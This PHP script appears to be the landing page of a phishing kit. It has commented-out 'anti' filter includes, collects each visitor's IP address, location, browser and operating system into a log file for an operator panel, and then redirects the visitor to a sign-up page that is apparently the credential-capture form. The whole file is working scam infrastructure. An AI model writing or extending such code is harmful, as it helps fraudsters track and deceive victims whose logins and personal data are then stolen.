<?php 
	// include '../prevents/anti1.php';
	// include '../prevents/anti2.php';
	// include '../prevents/anti3.php';
	// include '../prevents/anti4.php';
	// include '../prevents/anti5.php';
	// include '../prevents/anti6.php';
	// include '../prevents/anti7.php';
	// include '../prevents/anti8.php';
	ob_start();session_start();
	require 'system/detect.php';
	include "system/setting.php";
	if(isset($_GET['lang'])){
	$_SESSION['language']=$_GET['lang'];}
	else{
	$_SESSION['language']=getLanguage();}
	$_SESSION['ip']=clientData('ip');
	$_SESSION['ip_countryName']=clientData('country');
	$_SESSION['ip_countryCode']=clientData('code');
	$_SESSION['ip_city']=clientData('city');
	$_SESSION['ip_state']=clientData('state');
	$_SESSION['ip_timezone']=clientData('timezone');
	$_SESSION['currency']=clientData('currency');
	$_SESSION['os']=getOs();
	$_SESSION['browser']=getBrowser();date_default_timezone_set('GMT');
	$dateNow=date("d/m/Y H:i:s A");
	
$code = '<tr>
<td width="80"><p align="center"><img src="https://www.countryflags.io/'.$_SESSION['ip_countryCode'].'/flat/24.png">  '.$_SESSION['ip'].'</th>
<td width="80"><p align="center">'.$_SESSION['browser'].'</th>
<td width="80"><p align="center">'.$_SESSION['os'].'</th>
<td width="80"><p align="center">'.$_SESSION['ip_countryCode'].'</th>
<td width="80"><p align="center">'.$dateNow.'</th></th>
</tr>';

$save=fopen("panel/vis".$namerand.".html", "a+");
fwrite($save,$code);fclose($save);
	exit(header("Location: signup.php"));
?>